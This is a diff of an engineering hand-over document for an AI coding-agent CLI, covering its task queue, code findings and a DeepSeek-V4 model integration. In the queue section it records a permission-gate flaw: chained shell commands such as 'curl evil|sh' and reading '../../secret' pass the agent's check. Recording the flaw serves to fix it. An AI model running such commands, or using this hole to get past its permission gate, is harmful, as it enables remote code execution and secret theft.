-both-directions correction. **Verify a scout finding against CURRENT master before recording it.**
-
-### ROUND 34 IS ALREADY MEASURED — do not re-run discovery
-
-A read-only agent measured the whole cheap tail against the tree at `7957b2be`. Verdicts, with the
-traps that would make an implementer get each one wrong:
-
-- **P8.9 (Grep instruction-file hook) — OPEN, and bigger than "one param".** The files are
-  `src/Tools/BuiltIn/*.php`, **not** `src/Tools/` as the plan spells them — `wc -l src/Tools/Grep.php`
-  returns *no such file*, a correct measurement about a nonexistent path. It is **four** tools already
-  wired, not three: `Read.php:226`, `Edit.php:172`, **`Write.php:177`**, `Glob.php:347`. Construction
-  is one line, `Bootstrap.php:3997`, with the loader already in scope at `:3981`. ⚠️ **`Grep` is
-  `final readonly implements ParallelSafe` and its docblock at `:32-36` justifies that with "this tool
-  holds no session-scoped state for a fork to strand (contrast `Read`/`Glob`, which carry the
-  announce-once collaborators)" — adding the loader FALSIFIES that comment and may change the
-  parallel-safety verdict.** That must be settled in the same change. Also
-  `tests/Integration/BinSugarcrushWiringTest.php:261,311` loop over the literal `[Read, Edit, Glob]`,
-  so **`Write`'s wiring is unguarded today too**; one widening fixes both gaps.
-  **Blocked this round only because it edits `Bootstrap.php`, which lane `cmd` holds.**
-- **P8.4 (split-pane compositor) — OPEN, and the decision should be WIRE IT.** Option A (document as
-  a seam) is ~6-10 lines and the slot already exists — `ARCHITECTURE.md:381-389` lists "Built but
-  unwired" seams and the compositor would be a fifth entry. Option B (wire it) is **~200-300 lines**,
-  not 50 and not 500: a branch in `App::view()` → `TuiRenderer::renderView()` (`App.php:1076`), an
-  activation policy, and plumbing. The finished parts already exist and are test-covered —
-  `Tui/Renderer::renderWithSplit()` (`:62`), `MultiplexerSplitPane` (154 lines), and
-  `AgentManager::liveOutputs()` (`:341`) which already returns the exact shape the compositor wants.
-  **Take Option B.** The user's standing rule is that dormant subsystems get wired, not papered over,
-  and every prerequisite this item was waiting on now exists. ⚠️ **Two files named `Renderer.php`** —
-  `src/Renderer.php` holds the *docblock* (`:130-145`) that punts to this item, `src/Tui/Renderer.php`
-  holds the *code*. Do not close this on the docblock.
-- **P8.8 (repo-map) — OPEN, zero hits for `repo-map` in `src/` or `tests/`.** New
-  `src/Context/RepoMap.php` (~150-250 lines) + a system-prompt block; precedent is
-  `src/Context/EnvironmentBlock.php` and `ARCHITECTURE.md:224-241` (**not `:192`**) documents where a block slots in.
-  ⚠️ Its two halves take **different inputs** (a single lib reads `vendor/composer/autoload_*.php`;
-  the monorepo root reads `MATCHUPS.md`/`PROJECT_NAMES.md`), so a one-root implementation half-closes
-  it. **Adds a `src/` file → needs the census token.**
-- **P8.13 (model-callable `Task` tool) — OPEN, 500+ lines, an epic.** ⚠️ `src/Agents/Task.php` already
-  exists and is an unrelated data class, so the obvious name collides. `Bootstrap::tools()`'s docblock
-  (`:3925-3965`) hard-states "ELEVEN entries" as the domain for every "N built-in tools" figure in
-  `README.md` — a twelfth tool moves that docblock, the README and `BuiltInToolCorpus`.
-- **Finding #7 (`/permissions`) — OPEN, and the plan's "only this one" claim is CORRECT.**
-  `CommandRegistry::CONTROL_PLANE` (`:60`) reserves it; no row in `all()`, no dispatch arm. Its own
-  docblock at `:54-58` already admits the reservation. Cross-checked all seven reserved names: `quit`
-  has no row but IS dispatched (`Chat.php:5463`, deliberately an `exit` alias) — that is the near-miss
-  a sloppy grep reports as a second instance. `Chat::permissionGate()` (`:9182`) already reaches the
-  live gate; `PermissionGate::mode()` exists at `:85` but **there is no `rules()` accessor**.
-  ⚠️ **`PermissionGate::evaluate()` MUTATES the Auto-mode circuit breaker** (its docblock at `:96-101`
-  says `refuses()` is "the read-only question") — a `/permissions` preview built on `evaluate()` would
-  corrupt live breaker counters. **Blocked this round only because it edits `PermissionGate.php`,
-  which lane `cmd` holds.**
-- **Finding #6 and P7.6: ✅ done, see the table above.**
-
-### THE ITEM THAT UNBLOCKS A SAFE DEFAULT — promote it to the front of the queue
-
-**`sugar-crush` ships with `DEFAULT_PERMISSION_MODE = PermissionMode::BypassPermissions`
-(`src/Cli/Bootstrap.php:153`), and with the shipped empty rule set that is EXACTLY EQUAL to having
-no gate.** Supervisor-verified 2026-08-20. This is **deliberate, documented and currently correct** —
-`Bootstrap.php:2819-2840`, `README.md:827` and `docs/PERMISSIONS.md` all state it, and all three call
-it a stopgap rather than the settled design. Do NOT "fix" it by tightening the default; that would
-turn "no permission system" into "every Edit refused".
-
-The reason is named precisely, and so is the exit condition. Modes that answer Ask
-(`default`/`accept-edits`/`auto`) **fail CLOSED on the engine path**, because:
-
-1. **Nothing attaches an approver.** `EngineBackend::withPermissionApprover()`
-   (`src/Backend/EngineBackend.php:314`) has **no caller in `src/` at all** — supervisor-measured;
-   the only callers are `tests/Backend/EngineBackendPermissionGateTest.php` and
-   `tests/Integration/MemoryPromptWiringTest.php:320`. The constructor threads
-   `$permissionApprover` through all twelve `with*()` clones, so the seam is complete and wired to
-   nothing.
-2. **Behind that one:** `EngineBackend::completeAsync()` runs the turn in a `pcntl_fork()`ed child
-   whose only channel back to the parent is a **one-way frame stream**. An approver would need that
-   socket to become request/response before it could put a question on screen.
-
-**This is the highest-value item left in the plan for the user's stated goal of daily-driving
-sugar-crush**, and it is the "wire the dormant seam" shape the standing rule is about — the seam
-exists, is complete, and reaches nothing. Everything else in the permission surface is a guard rail
-on a gate that, by default, is not deciding anything. Round 33's `accept-edits` fix is real and
-worth having, but it only bites for a user who has explicitly opted into `accept-edits`.
-
-Sequencing note: piece 2 is the hard half and `Chat` already solves the equivalent problem for its
-OWN tool calls — the blocking `PermissionRequestMsg` / Veil modal flow, with `y`/`n`/`a` settling the
-paused call (`README.md:800`). So the design question is whether the forked child can be given a
-request/response channel, not whether the UI exists. Measure `completeAsync()`'s frame protocol
-before sizing this.
-
-### THE QUEUE AFTER THE THREE LANES LAND
-
-**P3.2 / P3.3 / P3.5-first-half are IN FLIGHT in `crush-lane-lsp`** — do not re-queue them. Out of
-scope there and still open: **P3.4** (`candy-sprinkles\Table` for `/sessions`, `/agents`, MCP list,
-LSP diagnostics — lands incrementally, reaches deep into `src/Chat.php`) and the **`candy-kit`
-restyle of `Cli\Help::screen()`** (`Help.php` is held by lane `cmd` this round).
-
-Two spelling traps measured for that lane and worth keeping: `candy-sprinkles`'s table class is at
-`candy-sprinkles/src/Table/Table.php`, i.e. a `Table\` SUB-namespace, not the `candy-sprinkles\Table`
-the plan writes; and `sugar-veil`'s `withClickOutsideDismiss(bool $enabled = true): self`
-(`Veil.php:195`) **is** spelled the way the plan says, which is the unusual case. All four sibling
-deps (`candy-focus`, `sugar-veil`, `candy-sprinkles`, `candy-kit`) are ALREADY in
-`sugar-crush/composer.json` and resolve in `vendor/sugarcraft/`, so Phase 3 needs no manifest change.
-
-
-1. **P8.9** + **finding #7 `/permissions`** — both were blocked only by lane `cmd`'s file hold, both
-   are fully measured above, and they bundle naturally (both are "a thing that exists everywhere
-   except one place").
-2. **P8.4 as Option B — wire the compositor.** Lane-sized, and its prerequisites are all in place.
-3. **P6.5** — two medium halves, ship as two PRs (`statusLine`, then the `keybindings` redesign; see
-   round 32's SUPERSEDED block for why the second is a redesign and not an addition).
-4. **P3.x** — candy-focus FocusRing (3.2), sugar-veil click-outside (3.3), candy-sprinkles Table
-   (3.4), and 3.5's unguarded byte-length `str_pad()` at `SplitLayout.php:238` (the `strlen()` the
-   plan tells you to grep for is GONE; the defect is not).
-5. **P8.8** (needs the census token), remaining findings #4 skills / #5 `agentRoster()` /
-   #8 docs, then **P8.13**, then **Phase 2 item 9** (plugins) LAST, then E1-E50.
-
----
-
-## SUPERSEDED — round 32's block. It is NOT "read this first" any more; §0-NOW-56 is. Kept for the standing rules and the DeepSeek record.
-
-**`master` = `d97580ab`. Live tree clean, 0 ahead / 0 behind. NOTHING IS IN FLIGHT.**
-The three lane dirs (`crush-lane-cmd`, `crush-lane-lsp`, `crush-lane-sglang`) were all clean, idle and
-current at `bde87f1c` when round 32 committed; the sync daemon rebases them onto `d97580ab`
-automatically because they satisfy its clean+idle condition. Any of them can be reused as-is.
-
-**ROUND 32 IS COMPLETE AND COMMITTED** — the re-verification sweep (read-only, three agents over
-Phases 1-3 / 4-6 / 7-8) plus the DeepSeek context-window correction, both in `d97580ab`. There is no
-partial work anywhere and no agent running.
-
-**Suite: `8111 tests / 91477 assertions / 1 skipped / rc 0` — SUPERVISOR-CONFIRMED TWICE.** Once as
-the gate left running at the round-31 compact (which matched the `cmd` lane's own figure at
-`f764b463`), and again after round 32's changes. The count did not move because round 32 changed only
-constant values that existing tests assert, plus documentation.
-**Skips MUST stay 1** — `tests/MCP/McpClientTest.php:106`. A 2 means `vendor/sugarcraft/*` was
-replaced by Packagist copies and every figure since is void.
-
-**62 of 75 — SETTLED, re-derived from the tree by the round-32 sweep.** Phase 0 14 + Phase 1 3 +
-Phase 2 8 + Phase 3 1 + Phase 4 7 + Phase 5 10 + Phase 6 4 + Phase 7 5 + Phase 8 10 = 62, over a
-denominator of 75. Item **8.15 is a standing flag, not a deliverable** (it proposes no fix and expects
-none), so the honest reading is **62 of 74 deliverables plus one flag**.
-
-**62 was right by accident.** The header said 62, the body said 56, and 62 wins only because it
-over-counted Phase 7 by one (item 6 is partial) and under-counted Phase 5 by one (item 10 is fully
-done, 10a *and* 10b) — the two errors cancelled. With only one of them present the number would have
-been quietly off by one forever, because nothing ever re-derived it. **Phase 7 is NOT complete.**
-
-**The twelve real items left:** 2.9 (deliberately-last plugin epic) · 3.2, 3.3, 3.4 open and 3.5
-partial · 6.5, 6.6 · 7.6 partial · 8.4, 8.8, 8.9, 8.13. The inline verdicts in `crush_code.md` carry
-the evidence for each; the ✅ markers are now applied so the document's own convention holds again.
-
-### WHAT LANDED IN ROUND 32
-
-| commit | what |
-|---|---|
-| `bde87f1c` | the round-31 gate confirmed at 8111, and the three-disagreeing-sources-of-truth finding |
-| `d97580ab` | **the re-verification sweep** (nine misstatements corrected inline, count re-derived, queue reordered) **+ the DeepSeek window moved to `1_048_570`** — and that number is `max_req_input_len`, not `max_model_len`; the doc-block on the constant explains why the smaller enforced figure is the right denominator |
-
-### WHAT LANDED IN ROUND 31
-
-| commit | what |
-|---|---|
-| `ed57d46a` | **DeepSeek-V4 sglang default** + a real `reasoning_effort` (user request, §0-DS) |
-| `1bd2e4d3` | **P8.10 + P8.11** — `EnvironmentBlock` size-capped git diff, `InstructionFileLoader` parent walk |
-| `f764b463` | **P6.3 + P6.4 + the argument-scoped permission-rule hole**, and four ways the first cut overclaimed |
-
-### THE SWEEP HAS RUN. WHAT IT FOUND, AND THE ONE RULE TO CARRY FORWARD
-
-Nine items were described incorrectly. All nine are corrected inline in `crush_code.md`. The four that
-matter before you pick up a lane:
-
-- **P5.1** quoted the base system prompt as "one string literal today: `'You are SugarCrush, an AI
-  coding assistant.'`". It has had `# Tone and style`, `# Tool use`, `# Acting vs. asking` and
-  `# Security` since `bf3495f5`. **P5.2** called five tool descriptions "one-clause each"; all five are
-  multi-sentence. Either line, left standing, sends an agent to rewrite finished work.
-- **P8.3** claimed the render branch was outstanding on the evidence "zero `stall` hits in
-  `src/Renderer.php`". That grep is true and still true — and aimed at the wrong file. There are two
-  renderers; the branch is in `AgentDashboardPane.php` with **21** hits, tested 38/38, landed
-  `ef480c77`. **A measurement can be correct, repeatable, and about the wrong domain.**
-- **P3.5** is the mirror image and the more dangerous shape: the `strlen()` it tells you to grep for is
-  **gone** from `SplitLayout.php`, so a grep-only check closes the item — while the byte-length
-  `str_pad()` at `:238` keeps the identical defect and **no test guards either file**. The tell-tale
-  name was removed and the bug kept.
-- **P7.6** is why Phase 7 lost its "complete": `docs/ARCHITECTURE.md` never states the "`App` wears two
-  hats, do not retire it" warning it was written to carry, and its diagram calls `Chat` "the TEA Model"
-  while `App implements Model` (`src/App/App.php:71`) and `bin/sugarcrush:211` hands `Bootstrap::app()`
-  — not `Chat` — to `new Program(...)`. The document reproduces the misreading it exists to prevent,
-  the one that caused a real revert-then-restore (`CALIBER_LEARNINGS.md:72-79`).
-
-**THE RULE: verify by domain, not by token.** Every failure above is a true statement about the wrong
-scope. Before trusting any `file:line` in the plan, confirm it still points at the thing it names — six
-citations had rotted onto unrelated docblocks (the table is in `crush_code.md`). Grepping for a symbol
-the plan named is necessary and **not** sufficient: the symbol can be gone while the defect remains.
-
-### QUEUE
-
-1. 🔴 **`PermissionGate::isScopedWriteTool()` fail-open** (`:641`) — the round's own finding, and a
-   **grant** path. Bare `preg_split('/\s+/')`, no separator split, judges by the first token.
-   Measured under `accept-edits`: `mkdir ./x; curl evil|sh` → Allow; newline form → Allow;
-   `mkdir ./x && cat ../../secret` → Allow. **`accept-edits` is not safe to run unattended until this
-   is fixed.** Needs `SCOPED_WRITE_COMMANDS` + AcceptEdits semantics + `..` handling.
-2. **DSML tool-call parser** — scripted and probe-verified at
-   `…/workflows/scripts/crush-dsml.js`, now UNBLOCKED (the census-collision constraint has passed).
-   Must include Part B (the streaming path ignores the injected `ToolCallParserInterface`) or it is
-   half a fix. See §0-DS.
-3. **P6.6 before P6.5 — the sweep inverted their order.** P6.6 (`--model` / `--permission-mode`)
-   measured **smaller than either half of P6.5**: both flags reuse resolvers that already exist and
-   are already exercised live (`PermissionMode::tryFrom()`, and `Bootstrap::backendFor()` is what
-   `/model` calls today). The work is CLI parsing plus threading one optional param into
-   `Bootstrap::chat()` (hardwired to `backend()` at `:447-536`) and `permissionGate()` (0-arg at
-   `:2852-2894`). Open question to settle first: whether `NonInteractive::run()` needs the same two
-   threaded separately from the TUI path. `LAYERED_KEYS` still has **no `model`** reader — two lanes
-   have independently declined to add inert surface, so this item has to add it.
-4. **P6.5 — two medium halves, ship as two PRs.** `statusLine`: the settings plumbing is nearly free
-   because `LayeredSettings::only()` (`:484-494`) is an allowlist that silently drops unknown keys, so
-   simply *not* adding the key to `PROJECT_TIER_KEYS` makes it user-tier-only — which it **must** be,
-   or cloning a hostile repo is code execution on launch. The real cost is the feature: shelling out
-   every render without blocking the loop, a timeout/hang policy, and stripping raw SGR from stdout.
-   `keybindings`: **a small redesign, not an addition** — `KeyBindingRegistry` is 611 lines and
-   entirely static ("a pure function of a constant", its own docblock), so an instance has to be
-   threaded through `Renderer.php:3314`/`:3340` (corrected from `:3270`/`:3296`) and `KeyboardHandler.php:49,98` **without** adding the
-   static setter that docblock warns against. Note the plan's claim that this half conflicts with
-   `src/Chat.php` is imprecise: `Chat.php` only comments on the registry; the real call sites — and
-   the real concurrency conflict with any other lane — are in `KeyboardHandler.php`.
-5. **P8.9 is the cheapest item left and is genuinely open.** `Grep.php` lacks the
-   `InstructionFileLoader` constructor param + `loadForPath()` call that `Read`/`Edit`/`Write`/`Glob`
-   all have. Confirmed **not** closed incidentally by P8.11, which was the unrelated `loadRoot()`
-   parent-walk. Good filler to bundle with anything above.
-6. **P3.x** — candy-focus FocusRing (3.2), sugar-veil click-outside (3.3), candy-sprinkles Table (3.4),
-   and 3.5's unguarded cell-width padding. All four confirmed genuinely open. **No
-   longer blocked** (the sglang task released `src/Chat.php`).
-7. Remaining findings: #4 skills, #5 `agentRoster()`, #6 (**smaller than recorded** — the
-   `HookManager` guard is correct and general, `registry->get($event,$name)` with no hardcoded list;
-   only its worked example names a nonexistent `confirm-remove`), #7 `/permissions`, #8 docs.
-8. **P7.6** (the `ARCHITECTURE.md` diagram + the two-hats warning — cheap, and it protects against a
-   repeat of a revert that already happened once), **P8.4** (a decision, not code: wire the compositor
-   or document the dormant seam in `ARCHITECTURE.md` — the source docblock that punts to "Phase 8 item
-   4's call" does **not** close it), **P8.8**, **P8.13**; then **Phase 2 item 9** (plugins) LAST, then
-   E1-E50.
-
-### STANDING CYCLE (unchanged, and it has held for 3 rounds)
-
-```sh
-git fetch --quiet origin                      # NEVER read a behind-count without this
-git pull --ff-only                            # live tree only; it has no agent
-cd sugar-crush && vendor/bin/phpunit          # POST-HOC GATE, every landed commit
-md5sum /home/sites/sugarcraft/.sugar-crush/config.json   # ABSOLUTE path; must stay 05480c743aff302fd6c06c5a4a4c2210
-php tools/check-path-repos.php --no-lib-path-repos       # rc 0
-ls -1 sugar-crush/vendor/sugarcraft/ | wc -l             # 18
-```
-
-**The sync daemon** (`…/scratchpad/sync-lanes.sh`, monitor `b7go03eox`) fetches everything every 90s,
-`--ff-only` pulls the live tree, and rebases a lane **only while it is clean AND has no process of its
-own running**. Deduped: emits on live moving, an auto-rebase, a new unpushed commit, or a lane past
-10 behind. **Re-arm it after a session restart.**
-
-**Tooling trap, three deep:** `node --check` PASSES a workflow script that `import` rejects. Only
-evaluating the script the way the runtime does is sufficient — wrap the body in an `async function`,
-stub `agent`/`parallel`/`phase`/`log`, run it, inspect the RENDERED prompts. Probe kept at
-`…/scratchpad/probe-wf.mjs <script>`.
-
-**Census literals are COUNTERS** (`BuiltInToolCorpusTest` now **279**). "No new `src/` file ⇒ no
-census collision" is FALSE — round 31's `lsp` bundle added no `src/` file and still moved
-`ContainedPathInventoryTest` and added 7 `ReadPathCensusTest` rows, because those track read sites.
-On a conflict confined to a count, **re-derive and continue**; STOP for anything else. See
-`crush_code_concurrency.md` §5.2e.
-
-### 0-DS. THE DEEPSEEK-V4 TASK — NOT A PLAN ITEM, and this is its only durable record
-
-**STATUS: LANDED as `ed57d46a` (2026-08-20). Suite 7975 / 91097 / 1 / rc 0.** Everything below is
-kept as the measured record. The ONE piece still outstanding is the DSML parser + streaming gap,
-scripted and ready at `…/workflows/scripts/crush-dsml.js` — see the DSML entry further down.
-
-**What the review round added on top of the implement stage:**
-
-- 🔴 **The MiniMax truncation warning was misfiring on DeepSeek-V4.**
-  `flagTruncationRiskInLatestToolResults()` warned about a MiniMax-M2.x `</parameter>` bug for
-  DeepSeek requests. Now takes `$model` and returns early for the DeepSeek-V4 family; **unmeasured**
-  models are still warned, and the text names the addressed model beside the measured one. Live
-  proof DeepSeek does not have the bug: a body containing
-  `<invoke name="x"><parameter name="y">z</parameter></invoke> DONE` came back **64/64 bytes,
-  identical, `</parameter>` intact**. The decode *diagnosis* stays ungated but no longer asserts
-  causation — `"This is the known MiniMax-M2.x bug"` became `"That matches the signature of…"`,
-  i.e. cause inferred from shape, not from model.
-- **The reviewer's disproof was itself wrong, and the fix agent reversed it.** The reviewer grepped
-  `generateTitle|titleFrom|sessionTitle`, found nothing, and concluded title generation never reaches
-  a provider. It does: `Chat.php:5906` → `Bootstrap::titleBackend()`, and `/compact`'s summaries →
-  `Bootstrap::summaryBackend()`, both via `toollessBackend()` (no `$tools`). So the doc-block's claim
-  was **true and merely uncited**. A reminder that a reviewer's grep is evidence about the grep.
-- **Model-family matching over-matches, deliberately.** `deepseek-v40`, `DeepSeek-V4.5` and
-  `DeepSeek-V4.1-Flash` all take the V4 arm. Accepted, with the asymmetry stated: a MISS costs
-  `reasoning_effort` and the thinking then lands silently in `content`; a wrong sampling number on a
-  probably-similar model does not. Pinned by an 11-row boundary test. Aliases (`dsv4`, `flash`,
-  `local-model`) fall to the MiniMax defaults — mitigated by documentation, not code, because a
-  one-shot warning could not tell an aliased V4 from a genuine MiniMax deployment.
-- ⚠️ **A config value of `1` for `reasoningEffort` throws on EVERY request.** JSON `1` is an int, the
-  DTO is `string|float|null`, the cast makes it `1.0`, and the server's bound is `le: 0.99`. The
-  construction-time guarantee covers the **string tier only** — deliberately, since the name set is a
-  closed pydantic literal while the float bound is one a later SGLang may widen. README now says
-  **"Write `0.99`, not `1`."** Both sides pinned, and the `1.0` test says in its doc-block that it
-  asserts a known-bad value is accepted *locally*, so a future range check fails it rather than
-  passing vacuously.
-- `contextWindow()` is a **transcribed constant, not a live read** — deliberately: it is a
-  render-path accessor and `Chat`'s four context tiers recompute per frame, so a synchronous HTTP
-  round trip would block the TUI on every redraw. Documented as decaying the way the 128,000 it
-  replaced did, with the `curl` to re-verify.
-
-**Two operational facts worth carrying:**
-
-- **The server is not a stable dependency.** `https://skynet2.interserver.net/v1` returned nginx
-  **502 for ~7 minutes** mid-task, on both `/v1/models` and `/v1/chat/completions`, and recovered on
-  its own. Any future agent handed "the server is reachable" should verify rather than assume.
-- **The `base_uri` trailing-slash trap was reproduced by accident and the guard is load-bearing.** A
-  hand-built Guzzle client with `'base_uri' => '…/v1'` (no trailing slash) sent every request to
-  `https://skynet2.interserver.net/chat/completions` — `/v1` silently dropped, per RFC 3986
-  absolute-path resolution. `SglangProvider::openAiCompatible()` already guards it
-  (`rtrim($baseUrl,'/') . '/'` plus a **relative** `'chat/completions'`). Anyone hand-constructing a
-  client for this provider in a test or probe must replicate the trailing slash.
-
-**The census literal is now 279** (`BuiltInToolCorpusTest`, bumped 278→279 by `LayeredSettings.php`).
-
-
-The user switched their self-hosted SGLang server from `MiniMax-M2.7` to
-**`deepseek-ai/DeepSeek-V4-Flash-0731`**. **The old model is GONE from that server**, so the
-shipped sglang default 404s on the model name today. Their instructions, verbatim in substance:
-make it the new default; add `reasoning_effort` supporting `low`/`high`/`max`; use
-`temperature = 1.0` with `top_p = 0.95` for agentic and `1.0` otherwise; test tool parsing against
-the live server; **"dont delete old handling we want it to support both ways"**; and (later) **"for
-now set it to max as default for this model"**.
-
-**Measured against the live server by the supervisor, 2026-08-20 — believe this over the model card:**
-
-- Endpoint `https://skynet2.interserver.net/v1`, **no API key**. `GET /v1/models` →
-  `deepseek-ai/DeepSeek-V4-Flash-0731`, `max_model_len` **1048576** — but **the constant tracks
-  1048570, and that is deliberate.** The server publishes two nearly-identical figures and the
-  difference is the domain: `/v1/models` `max_model_len` = 1048576 is the model's TOTAL window
-  (input + output), while `https://skynet2.interserver.net/server_info`
-  `max_req_input_len` = **1048570** is the ceiling the scheduler enforces on one request's INPUT and
-  the one that actually returns an error. `contextWindow()` is the denominator of every context tier,
-  and `ProviderInterface::contextWindow()` states that erring LARGE is the harmful direction (too
-  large switches the tiers off rather than firing early), so the input limit wins. Also note
-  `/server_info` reports `context_length: null` — this deployment was **never launched with
-  `--context-length`**, so any doc here citing that flag for DeepSeek is describing the MiniMax
-  deployment it replaced. ⚠️ This slot read **393216** when first measured on 2026-08-20, was already
-  wrong by the end of that day, then briefly held 1048576 from the wrong field. **Re-`curl` both
-  endpoints before trusting any figure in this section.**
-- **Tool calls come back as STRUCTURED OpenAI `tool_calls`, non-streaming AND streaming.**
-  Non-streaming: `finish_reason: "tool_calls"`, `function.arguments` a JSON string. Streaming
-  (`stream:true`, two-city prompt): 19 SSE chunks, 10 `delta.reasoning_content` deltas, **two
-  parallel calls at `index` 0 and 1** accumulating correctly with distinct `call_…` ids.
-  **So `OpenAiArrayToolCallParser` already covers this model and NO new parser class is needed.**
-- The HF card says the model ships **no Jinja chat template** and documents no `--tool-call-parser`
-  (only `--speculative-algorithm DSPARK --trust-remote-code`). **The deployment contradicts the
-  card** — someone configured a parser. If any prompt shape ever yields a tool call as *text*, that
-  is what `MinimaxXmlFallbackToolCallParser` exists for.
-- **`reasoning_effort`: the server accepts MORE than the card's three.** Its own validation error is
-  authoritative: `literal['none','minimal','low','medium','high','xhigh','max']` **or a constrained
-  float**. Measured `low`→29, `high`→55, `max`→63 reasoning_tokens, and **`medium` works** (22).
-  `bogus` → `{"object":"error"}` carrying that literal list. **Do not narrow to three** — that
-  refuses values the server serves.
-- **Omitting `reasoning_effort` is NOT neutral:** `reasoning_content` is `null`, `reasoning_tokens`
-  0, and the model's thinking lands **inline in `content`**. An absent effort pollutes assistant
-  text — an independent argument for defaulting it.
-- **It was not configurable at all before this work.** Zero occurrences of
-  `reasoning_effort`/`reasoningEffort` in `src/`, `bin/`, `tests/` or any config;
-  `CompleteRequest` had 13 params and none was it. `extraTemplateKwargs` → `chat_template_kwargs`
-  is the WRONG seam (server-side Jinja template, which this model lacks). Already correct and
-  present: `'separate_reasoning' => true` at `SglangProvider.php:319`, which is what makes
-  `reasoning_content` populate.
-- **`temperature` defaulted to `0.7`** at `SglangProvider.php:310`, not 1.0, and `:323` sent
-  `top_p => $request->topP` (null when unset). The fix must be **model-aware** — silently retuning
-  MiniMax violates the user's keep-both-working rule.
-- **CORRECTED BY THE IMPLEMENT AGENT: the default model lived in FOUR tracked places, not three.**
-  My brief named three and missed `ProviderFactory::defaultConfig('sglang')['model']` (was line 363)
-  — **the one that `$SUGARCRUSH_PROVIDER=sglang` actually reaches**, because `defaultConfig()` is
-  `bin/sugarcrush`'s only hook into the provider system. Changing three of four would have left the
-  plain `sglang` provider type 404ing on the model name. All four now fixed, and `defaultConfig`
-  reads `SglangProvider::DEFAULT_MODEL` so the two cannot drift. The three my brief did name were:
-  `src/Providers/SglangProvider.php:68`, `/.sugar-crush/config.dev.json`, and
-  `/sugar-crush/.sugar-crush/config.dev.json`. **`config.dev.json` is NOT the md5 invariant** —
-  that is `.sugar-crush/config.json` (no `.dev`). File 3 has a hardlink partner OUTSIDE the repo, so
-  an in-place rewrite changes that path too while a `sed -i` breaks the link.
-- **A SECOND BUG THE BRIEF NEVER MENTIONED, found by the implement agent:
-  `SglangProvider::contextWindow()` hard-returned `196_608` while the live server reports
-  `max_model_len: 393216`** — and its doc-block asserted that 196,608 *was* the live
-  `--context-length`. So all four of `Chat`'s context tiers were sized against half the real budget
-  while the comment claimed otherwise. The recurring defect (a number carrying the wrong domain)
-  found in shipped code rather than in a review. Now model-aware: **1,048,570** for DeepSeek-V4
-  (393,216 when this fix landed; the deployment grew the same day), 196,608 preserved for everything
-  else. **The fix was model-awareness, and that is what holds — the number itself decayed within
-  hours of being written, which is the argument for the awareness rather than against it.** Note the residue the agent flagged rather than silently
-  "improving": `LEGACY_DEFAULT_CONTEXT_WINDOW = 196_608` is a *MiniMax* figure now serving as the
-  fallback for every third model — a guess. `0` would be honest but would disable all four tiers on
-  MiniMax, so behaviour was preserved and the domain documented on the constant.
-- **Measured bounds, sharper than the brief's "a constrained float":** `0.0` OK, `0.5` OK, `0.99` OK,
-  `1.0` REJECTED (`le: 0.99`), `-0.5` and `1.5` REJECTED — so `0.0 <= x <= 0.99` on this deployment.
-  The float is forwarded **without a local range check on purpose**, so a later SGLang widening the
-  bound is not refused by us; out-of-range fails loudly at the server, whose 400 names the live
-  bound. The seven NAMES are validated locally (closed, server-authoritative set), so a typo fails
-  before any request is sent.
-- **`reasoning_effort` is emitted TOP-LEVEL** in `buildParams()`, not under `chat_template_kwargs`.
-  Confirmed no prompt shape produced a text tool call at any of the seven effort levels, with effort
-  absent, or with `separate_reasoning` absent — **so no new parser class was needed** and the
-  existing `OpenAiArrayToolCallParser` handled every live payload unmodified.
-- **PHP encodes `1.0` as JSON `1`** (Guzzle's `json` option sets no `JSON_PRESERVE_ZERO_FRACTION`),
-  so the DeepSeek defaults go on the wire as `"temperature":1,"top_p":1`. SGLang's pydantic coerces
-  int to float and returns 200 — probed, and pinned in a test on the raw body so nobody later reads
-  a capture as a lost decimal.
-- **"Agentic" was pinned to "the request offered tools"** — the only agentic signal a
-  `CompleteRequest` carries. `Runtime` always passes tools, so in practice `top_p` is 0.95 for chat
-  turns and 1.0 for tool-less side calls (compaction summaries, titles).
-- 🔴 **THE TEXT FALLBACK COVERS THE WRONG SHAPE FOR THE NEW DEFAULT MODEL.** The user pointed at
-  `https://huggingface.co/deepseek-ai/DeepSeek-V4-Flash-0731/blob/main/encoding/README.md`
-  (fetched 2026-08-20). DeepSeek-V4's **native** tool-call emission is **DSML markup**, not JSON and
-  not MiniMax XML:
-
-  ```
-  <｜DSML｜tool_calls>
-  <｜DSML｜invoke name="$TOOL_NAME">
-  <｜DSML｜parameter name="$PARAM" string="true|false">$VALUE</｜DSML｜parameter>
-  </｜DSML｜invoke>
-  </｜DSML｜tool_calls>
-  ```
-
-  `string="true"` means the value is a raw string; `string="false"` means it is JSON (number,
-  boolean, array, object) — so the flag is load-bearing and a parser that ignores it will hand the
-  model's numbers over as strings. Tool results go back as `<tool_result>{json}</tool_result>`.
-  Reasoning is delimited `<think>…</think>` between the `<｜Assistant｜>` prefix and the content.
-  Other special tokens: `<｜begin▁of▁sentence｜>`, `<｜end▁of▁sentence｜>`, `<｜User｜>`.
-
-  **Measured: the tree has ZERO occurrences of `DSML` in `src/`, `tests/` or `bin/`.** The parser
-  directory holds exactly three files — `OpenAiArrayToolCallParser`, `ToolCallParserInterface`, and
-  `MinimaxXmlFallbackToolCallParser`. So the wired text fallback parses a shape **this model never
-  emits**. A fallback that exists, is wired, and covers the wrong model is the recurring defect at
-  architecture level.
-
-  **Why it is not academic:** the deployment returns structured `tool_calls` today only because
-  someone passed `--tool-call-parser`, which **the HF card's own documented launch command omits**
-  (it shows only `--speculative-algorithm DSPARK --trust-remote-code`). A restart without that flag
-  turns every tool call into raw text that the OpenAI-array parser cannot see and the MiniMax
-  fallback cannot match — the agent would silently do nothing on every tool call, which is the
-  quietest possible failure.
-
-  **Queued as an additive follow-up** (`DsmlToolCallParser` alongside, never replacing — the user's
-  "support both ways" rule). Two sequencing constraints: it is the **first new `src/` file** in this
-  task, so it moves the census literals (`BuiltInToolCorpusTest`, `ReadPathCensusTest`,
-  `ContainedPathInventoryTest`) and must not run while another lane is also adding a `src/` file;
-  and the streaming path still ignores the injected `ToolCallParserInterface` (pre-existing §12 D2
-  gap), so a DSML parser wired only into the non-streaming path would still recover nothing while
-  streaming — that gap has to be closed in the same bundle or the fix is half a fix.
-
-  Also from that page, worth knowing but **not** actionable for us: `reasoning_effort` is implemented
-  server-side as a **text prefix prepended before the system message**, and `"low"` maps to *no
-  prefix*. So the levels are prompt shaping, not a sampling knob. The card documents prefixes for
-  only `low`/`high`/`max` while the server accepts seven names — consistent with the deployment
-  being ahead of the card, which is the standing rule for this model.
-
-- **SUPERVISOR TO-DO once the sglang lane commits** (its agent correctly refused to edit these —
